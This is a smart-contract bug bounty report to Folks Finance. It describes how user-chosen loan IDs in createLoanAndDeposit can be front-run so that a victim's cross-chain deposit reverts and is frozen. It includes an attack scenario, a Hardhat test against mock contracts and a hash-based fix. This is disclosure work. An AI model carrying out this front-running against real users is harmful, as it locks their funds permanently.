# Boost \_ Folks Finance 33869 - \[Smart Contract - Medium] loanIds are easy to reproduce and front-runn

Submitted on Wed Jul 31 2024 14:44:48 GMT-0400 (Atlantic Standard Time) by @jovi for [Boost | Folks Finance](https://immunefi.com/bounty/folksfinance-boost/)

Report ID: #33869

Report type: Smart Contract

Report severity: Medium

Target: <https://immunefi.com/>

Impacts:

* Permanent freezing of funds

## Description

## Brief/Intro

When creating a loan and a deposit at a single transaction, users can arbitrarily select the loanId as an argument for the createLoanAndDeposit function at the SpokeToken contract:

```solidity
function createLoanAndDeposit(
        Messages.MessageParams memory params,
        bytes32 accountId,
        bytes32 loanId,
        uint256 amount,
        uint16 loanTypeId,
        bytes32 loanName
    ) external payable nonReentrant {
```

This loanId can be observed by mempool watchers and front-run in order to induce transaction reversion when the bridge adapters attempt to receive the message to create the loan at the target chain.

## Vulnerability Details

When creating a loan and a deposit, a user can pick any loan id as he/she desires. However, any other user can call the same function with the same loanId but with a different amount of assets.

The issue with that lies at the LoanManager's createUserLoan function at the Hub chain, as it reverts if the loanId has already been created:

```solidity
function createUserLoan(
...
if (isUserLoanActive(loanId)) revert UserLoanAlreadyCreated(loanId);
...
}
```

So, if 1 user attempts a createLoanAndDeposit function call and sends some assets he/she is always at risk at being front-run and locking the assets without clear pathways for recovery.

## Impact Details

Users that create new loans with deposits may end up having their funds stuck if they are front-run.

In case the bridge logic is Chainlink's CCIP, the funds will be irrecoverable, as both the TokenAdapter and DataAdapter are non-upgradeable and Chainlink's manual execution (as a manner to attempt to receive the message again) will keep reverting. Since the adapters also don't have `retryFailedMessage` implementations, the funds are stuck.

As the TokenAdapter and DataAdapter contracts do not gracefully handle errors by calling the actions inside ccipReceive in try/catch blocks, there will be no other mechanism to attempt running the message again at the Hub chain.

The SpokeToken contracts don't have built-in mechanisms to return the funds to users in case the message fails at the target chain. Therefore users may lose their funds with no chance of recovery.

## References

[Transfer Tokens with Data - Defensive Example | Chainlink Documentation](https://docs.chain.link/ccip/tutorials/programmable-token-transfers-defensive#receiving-and-processing-messages)

[documentation/public/samples/CCIP/usdc/Receiver.sol at 11879087fa2ed3a1dda5461886dd8257b6180325 · smartcontractkit/documentation (github.com)](https://github.com/smartcontractkit/documentation/blob/11879087fa2ed3a1dda5461886dd8257b6180325/public/samples/CCIP/usdc/Receiver.sol#L123C1-L124C80)

## Mitigation

The usage of hash-based loan IDs may fix the issue, as the one-way cryptographic property may make it impossible to reproduce loan IDs. Consider the following solution:

```solidity
function createLoanAndDeposit(
    Messages.MessageParams memory params,
    bytes32 accountId,
    bytes32 loanSalt,
    uint256 amount,
    uint16 loanTypeId,
    bytes32 loanName
) external payable nonReentrant {
    bytes32 _loanId = keccak256(
        abi.encodePacked(loanSalt, accountId, amount, loanTypeId, loanName)
    );
    _doOperation(
        params,
        Messages.Action.CreateLoanAndDeposit,
        accountId,
        amount,
        abi.encodePacked(_loanId, amount, loanTypeId, loanName)
    );
}
```

## Proof of concept

## Proof of concept

Hub chain: Avax Spoke chain: ETH

Alice is currently in ETH and wants to create a loan and deposit 100e18 worth of tokenA at Avax.

She calls the SpokeToken createLoanAndDeposit function with loanId set to 0x01.

Bob observes the mempool and front-runs her call by creating a loan and deposit with 1e18 worth of tokenA and loanId = 0x01.

Since Bob has front-run Alice, CCIP router picks up Bob's message first and creates the loan at the Hub chain for him.

The CCIP router then attempts to create a loan for Alice, but since a loan with equal ID already exists, it reverts and the message is lost.

The following test can also be placed at the Hub.test.ts file, but it will not revert at the final condition as the MockLoanManager contract doesn't implement any logic but to emit the CreateUserLoan event:

```typescript
it("Should not be able to create loan with same loan Id", async () => {
        const { user, poolId, bridgeRouter, loanManager, spokeChainId, spokeAddress, hubAddress } =
          await loadFixture(deployHubFixture);

        // call create user loan and deposit
        const messageId: string = getRandomBytes(BYTES32_LENGTH);
        const accountId: string = getAccountIdBytes("ACCOUNT_ID");
        const loanId: string = getRandomBytes(BYTES32_LENGTH);
        const amount: bigint = BigInt(1e18);
        const loanTypeId: number = 0;
        const loanName: string = getRandomBytes(BYTES32_LENGTH);
        const payload = buildMessagePayload(
          Action.CreateLoanAndDeposit,
          accountId,
          user.address,
          ethers.concat([
            loanId,
            convertNumberToBytes(poolId, UINT8_LENGTH),
            convertNumberToBytes(amount, UINT256_LENGTH),
            convertNumberToBytes(loanTypeId, UINT16_LENGTH),
            loanName,
          ])
        );
        const message: MessageReceived = {
          messageId,
          sourceChainId: BigInt(spokeChainId),
          sourceAddress: convertEVMAddressToGenericAddress(spokeAddress),
          handler: convertEVMAddressToGenericAddress(hubAddress),
          payload,
          returnAdapterId: BigInt(0),
          returnGasLimit: BigInt(0),
        };
        const createUserLoanAndDeposit = await bridgeRouter.receiveMessage(message);

        // verify create user loan and deposit are called
        await expect(createUserLoanAndDeposit)
          .to.emit(loanManager, "CreateUserLoan")
          .withArgs(loanId, accountId, loanTypeId, loanName);
        await expect(createUserLoanAndDeposit)
          .to.emit(loanManager, "Deposit")
          .withArgs(loanId, accountId, poolId, amount);
        await expect(createUserLoanAndDeposit).to.emit(bridgeRouter, "MessageSucceeded").withArgs(message.messageId);

        const messageId2: string = getRandomBytes(BYTES32_LENGTH);
        const accountId2 = getAccountIdBytes("ACCOUNT_ID2");
        const payload2 = buildMessagePayload(
          Action.CreateLoanAndDeposit,
          accountId2,
          user.address,
          ethers.concat([
            loanId,
            convertNumberToBytes(poolId, UINT8_LENGTH),
            convertNumberToBytes(amount, UINT256_LENGTH),
            convertNumberToBytes(loanTypeId, UINT16_LENGTH),
            loanName,
          ])
        );
        const message2: MessageReceived = {
          messageId: messageId2,
          sourceChainId: BigInt(spokeChainId),
          sourceAddress: convertEVMAddressToGenericAddress(spokeAddress),
          handler: convertEVMAddressToGenericAddress(hubAddress),
          payload: payload2,
          returnAdapterId: BigInt(0),
          returnGasLimit: BigInt(0),
        };
        const createUserLoanAndDeposit2 = (await bridgeRouter.receiveMessage(message2));
        await expect(createUserLoanAndDeposit2)
          .to.revertedWith("UserLoanAlreadyCreated");
      });
```

It can be run with the following command from the main folder:

```shell
npx hardhat test --grep "Should not be able to create loan with same loan Id"
```
